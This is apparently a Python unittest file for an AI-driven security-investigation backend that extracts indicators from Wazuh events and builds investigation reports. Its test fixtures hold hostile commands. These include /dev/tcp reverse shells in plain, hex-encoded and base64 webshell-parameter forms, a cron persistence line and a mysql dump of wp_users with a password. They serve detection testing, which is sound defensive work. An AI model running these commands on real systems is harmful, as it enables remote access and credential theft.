from __future__ import annotations

import asyncio
import json
import os
import sys
import tempfile
import unittest

# Navigate from .claude/skills/run-aci-backend/tests/ up to project root (4 levels)
project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
sys.path.insert(0, project_root)
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "aci.settings")
os.environ.setdefault("SECRET_KEY", "test")
os.environ["BOARD_DB_PATH"] = tempfile.mktemp(suffix=".db")

import django

django.setup()

from aci_board import store as board_store
from agent.runtime.analysis.artifacts import extract_artifacts
from agent.runtime.graph import (
    _derive_report_guardrails,
    _format_board_context,
    pivot,
    use_tools,
)
from agent.runtime.graph.nodes_flow import _merge_preserved_findings
from langchain_core.messages import AIMessage


class EventSearchTool:
    name = "search"

    async def ainvoke(self, args):
        return json.dumps({
            "hits": {
                "hits": [{
                    "_id": "event-1",
                    "_source": {
                        "data": {
                            "srcip": "8.8.8.8",
                            "dstuser": "alice",
                            "sha256": "a" * 64,
                        },
                        "host": {"name": "web-01"},
                        "process": {"name": "curl"},
                    },
                }]
            }
        })


class TestFindingsBoard(unittest.TestCase):
    def setUp(self):
        board_store.init_db()
        import sqlite3

        connection = sqlite3.connect(os.environ["BOARD_DB_PATH"])
        connection.execute("DELETE FROM board_entries")
        connection.commit()
        connection.close()

    def test_record_artifacts_returns_only_run_novel(self):
        # Re-touching a known entity yields NO new artifacts, so a batch that surfaces
        # only already-seen IOCs cannot look like progress (novelty gate for #3).
        from agent.runtime.analysis.artifacts import record_artifacts
        raw = json.dumps({"total": 1, "events": [{
            "_id": "e1", "agent.name": "wazuh-client",
            "data.srcip": "203.0.113.9", "data.dstip": "198.51.100.7"}]})
        kw = dict(case_id="~n", run_id="run-n", agent_name="investigation")
        first = record_artifacts(raw, **kw)
        self.assertTrue(first)  # novel on first sight
        second = record_artifacts(raw, **kw)
        self.assertEqual(second, [])  # same entities → nothing novel
        # A genuinely new IOC in a later batch is still surfaced.
        raw2 = json.dumps({"total": 1, "events": [{
            "_id": "e2", "agent.name": "wazuh-client", "data.dstip": "192.0.2.55"}]})
        third = record_artifacts(raw2, **kw)
        self.assertTrue(any("192.0.2.55" in a.value for a in third))

    def test_preserved_findings_replace_none_section(self):
        report = (
            "## Findings\n"
            "- None.\n\n"
            "## Hypotheses\n"
            "- [Open] Persistence remains unproven.\n\n"
            "## New Leads\n"
            "- None.\n"
        )
        merged = _merge_preserved_findings(report, [{
            "summary": "event e1 confirmed privileged local execution",
            "event_ids": ["e1"],
        }])
        self.assertIn("event e1 confirmed privileged local execution", merged)
        self.assertNotIn("- None.\n\n## Hypotheses", merged)
        self.assertIn("## Hypotheses", merged)

    def test_hex_encoded_reverse_shell_is_decoded_as_command_artifact(self):
        # Crontab entry stored as hex: sh -i >& /dev/tcp/10.0.2.5/5555 0>&1
        hex_payload = "7368202d69203e26202f6465762f7463702f31302e302e322e352f3535353520303e2631"
        raw = json.dumps({"hits": {"hits": [{
            "_id": "evt-hex",
            "_source": {
                "data": {"audit": {"command": f"echo {hex_payload} | xxd -r -p | sh"}},
            },
        }]}})
        artifacts = extract_artifacts(raw)
        kinds = {a.kind for a in artifacts}
        commands = [a.value for a in artifacts if a.kind == "command"]
        ips = [a.value for a in artifacts if a.kind == "ip"]
        # The decoded payload must appear as a command artifact
        self.assertTrue(any("[hex-decoded]" in c and "/dev/tcp/" in c for c in commands),
                        f"decoded shell not found in commands: {commands}")
        # The C2 IP must be extracted from the decoded payload
        self.assertIn("10.0.2.5", ips, f"C2 IP missing from artifacts: {ips}")

    def test_base64_webshell_reverse_shell_in_url_param_is_decoded(self):
        # Webshell payload (Phase 2 #5): a reverse-shell argv array base64'd into a
        # ?wp_meta= URL query parameter. Must be decoded, recorded as a command, and
        # the C2 IP mined out of it.
        import base64
        argv = ["bash", "-c", " '0<&196;exec 196<>/dev/tcp/192.168.130.77/51898; sh <&196 >&196 2>&196'", "&"]
        token = base64.b64encode(json.dumps(argv).encode()).decode()
        raw = json.dumps({"hits": {"hits": [{
            "_id": "evt-webshell",
            "_source": {"data": {
                "url": f"/wp-content/uploads/2022/01/x.php?wp_meta={token}",
                "srcip": "172.17.130.196",
            }},
        }]}})
        artifacts = extract_artifacts(raw)
        commands = [a.value for a in artifacts if a.kind == "command"]
        ips = [a.value for a in artifacts if a.kind == "ip"]
        self.assertTrue(any("/dev/tcp/" in c and "decoded" in c.lower() for c in commands),
                        f"decoded reverse shell not found: {commands}")
        self.assertIn("192.168.130.77", ips, f"C2 IP missing: {ips}")

    def test_base64_webshell_argv_without_shell_keyword_is_decoded(self):
        # Credential-dump payload: a JSON argv array with NO reverse-shell keyword
        # (mysql ... select * from wp_users). The argv-shape classifier must still
        # surface it as a command artifact.
        import base64
        argv = ["mysql", "-u", "wordpress", "-ptainoox3aedeeSh", "wordpress_db", "-e", "select * from wp_users"]
        token = base64.b64encode(json.dumps(argv).encode()).decode()
        raw = json.dumps({"hits": {"hits": [{
            "_id": "evt-dump",
            "_source": {"data": {"url": f"/x.php?wp_meta={token}"}},
        }]}})
        commands = [a.value for a in extract_artifacts(raw) if a.kind == "command"]
        self.assertTrue(any("mysql" in c and "wp_users" in c for c in commands),
                        f"decoded credential dump not found: {commands}")

    def test_random_base64_noise_is_not_recorded_as_command(self):
        # A non-command base64 blob (random id/token) must NOT produce a command
        # artifact — the command classifier, not the decode, is the gate.
        import base64
        noise = base64.b64encode(b"this is just some opaque session identifier value 12345").decode()
        raw = json.dumps({"hits": {"hits": [{
            "_id": "evt-noise",
            "_source": {"data": {"url": f"/page?token={noise}"}},
        }]}})
        commands = [a.value for a in extract_artifacts(raw) if a.kind == "command"]
        self.assertEqual(commands, [], f"noise leaked as command: {commands}")

    def test_fim_diff_reverse_shell_is_cleaned_of_diff_markers(self):
        # Wazuh FIM/syscheck stores the changed crontab line as a diff blob. The
        # whole blob must not become `command: 0a1` / `command: > ...` noise —
        # only the clean shell line should be recorded.
        raw = json.dumps({"hits": {"hits": [{
            "_id": "evt-diff",
            "_source": {
                "syscheck": {
                    "path": "/var/spool/cron/crontabs/user",
                    "diff": "0a1\n> * * * * * sh -i >& /dev/tcp/10.0.2.5/5555 0>&1",
                },
            },
        }]}})
        artifacts = extract_artifacts(raw)
        commands = [a.value for a in artifacts if a.kind == "command"]
        ips = [a.value for a in artifacts if a.kind == "ip"]
        # The clean shell line is recorded...
        self.assertTrue(
            any(c == "* * * * * sh -i >& /dev/tcp/10.0.2.5/5555 0>&1" for c in commands),
            f"clean shell line not found in commands: {commands}",
        )
        # ...and no diff-marker noise leaked as a command artifact.
        self.assertFalse(
            any(c.strip() in {"0a1", ">", "<"} or c.startswith(("> ", "< ", "0a1"))
                for c in commands),
            f"diff-marker noise leaked into commands: {commands}",
        )
        self.assertIn("10.0.2.5", ips, f"C2 IP missing from artifacts: {ips}")

    def test_nested_event_artifacts_are_extracted(self):
        artifacts = extract_artifacts(asyncio.run(EventSearchTool().ainvoke({})))
        pairs = {(item.kind, item.value, item.source) for item in artifacts}
        self.assertIn(("ip", "8.8.8.8", "event-1"), pairs)
        # event_id is provenance-only (source field), never emitted as an artifact
        self.assertNotIn("event_id", {kind for kind, _, _ in pairs})
        self.assertIn(("user", "alice", "event-1"), pairs)
        self.assertIn(("host", "web-01", "event-1"), pairs)
        self.assertIn(("process", "curl", "event-1"), pairs)
        self.assertIn(("sha256", "a" * 64, "event-1"), pairs)

    def test_audit_uid_suffix_is_stripped_from_user_artifacts(self):
        raw = json.dumps({"hits": {"hits": [{
            "_id": "ev-uid",
            "_source": {"data": {
                "srcuser": "user(uid=1000)",
                "dstuser": "root(uid=0)",
                "audit": {"euid": "0"},
            }},
        }]}})
        users = {a.value for a in extract_artifacts(raw) if a.kind == "user"}
        # Audit display forms collapse onto the plain account names.
        self.assertIn("user", users)
        self.assertIn("root", users)
        self.assertNotIn("user(uid=1000)", users)
        self.assertNotIn("root(uid=0)", users)

    def test_tool_result_populates_artifacts_without_board_tool(self):
        state = {
            "run_id": "run-artifacts",
            "case_id": "case-artifacts",
            "agent_name": "investigation",
            "messages": [AIMessage(
                content="",
                tool_calls=[{"id": "call-1", "name": "search", "args": {"query": "*"}}],
            )],
            "tool_calls_made": 0,
            "current_intent": "I will retrieve the event.",
            "intent_sequence": 1,
        }
        asyncio.run(use_tools(state, {"configurable": {"tools": [EventSearchTool()]}}))

        entries = board_store.list_entries(
            "case-artifacts", "run-artifacts", "investigation"
        )
        self.assertTrue(entries)
        self.assertIn("artifact", {entry["kind"] for entry in entries})
        self.assertIn("ip: 8.8.8.8", {entry["content"] for entry in entries})

    def test_hypotheses_are_persisted_without_model_tool_call(self):
        state = {
            "case_id": "case-hypothesis",
            "run_id": "run-hypothesis",
            "agent_name": "investigation",
            "final_answer": (
                "## Findings\n- None confirmed.\n\n"
                "## Hypotheses\n"
                "- The scheduled task may provide persistence for the downloaded script.\n"
                "- The privileged command may have been executed by a compromised account."
            ),
        }
        asyncio.run(pivot(state, {"configurable": {"tools": []}}))

        entries = board_store.list_entries(
            "case-hypothesis", "run-hypothesis", "investigation"
        )
        hypotheses = [entry for entry in entries if entry["kind"] == "hypothesis"]
        self.assertEqual(len(hypotheses), 2)
        self.assertTrue(all(entry["status"] == "open" for entry in hypotheses))

    def test_context_contains_artifacts_facts_and_hypotheses(self):
        raw = json.dumps({"entries": [
            {"kind": "artifact", "content": "ip: 8.8.8.8", "source": "event-1"},
            {"kind": "fact", "content": "The task ran as root.", "source": "event-2"},
            {
                "kind": "hypothesis",
                "content": "The task established persistence.",
                "source": "",
                "status": "open",
                "confidence": "medium",
            },
        ]})
        context = _format_board_context(raw)
        self.assertIn("Found artifacts", context)
        self.assertIn("Confirmed facts", context)
        self.assertIn("Hypotheses", context)
        self.assertIn("pivot on relevant artifacts", context)

    def test_section_parser_stops_at_h3_and_hypotheses_headers(self):
        state = {
            "case_id": "case-sections",
            "run_id": "run-sections",
            "agent_name": "investigation",
            "final_answer": (
                "## Findings\n"
                "- Event evt-1 at 2025-04-20T03:54:00Z modified crontab.\n"
                "This narrative line should not be parsed as a fact.\n\n"
                "## Hypotheses\n"
                "- The attacker established cron persistence."
            ),
        }
        asyncio.run(pivot(state, {"configurable": {"tools": []}}))

        entries = board_store.list_entries(
            "case-sections", "run-sections", "investigation"
        )
        facts = [entry["content"] for entry in entries if entry["kind"] == "fact"]
        hypotheses = [entry["content"] for entry in entries if entry["kind"] == "hypothesis"]
        self.assertEqual(facts, ["Event evt-1 at 2025-04-20T03:54:00Z modified crontab."])
        self.assertEqual(hypotheses, ["The attacker established cron persistence."])

    def test_report_guardrails_correlate_reverse_shell_to_bruteforce_source(self):
        facts = [
            {
                "kind": "fact",
                "content": "2025-04-19: SSH brute force from 10.0.2.5 against kali.",
            },
            {
                "kind": "fact",
                "content": (
                    "2025-04-20: crontab added reverse shell "
                    "`sh -i >& /dev/tcp/10.0.2.5/5555 0>&1`."
                ),
            },
            {
                "kind": "fact",
                "content": "Rootcheck flagged trojaned /bin/diff and /usr/bin/diff.",
            },
        ]
        derived, guardrails = _derive_report_guardrails([], facts, [], [])

        self.assertTrue(any("10.0.2.5" in finding for finding in derived))
        self.assertIn("Severity floor: critical", guardrails)
        self.assertIn("decisive linkage", guardrails)


if __name__ == "__main__":
    unittest.main(verbosity=2)
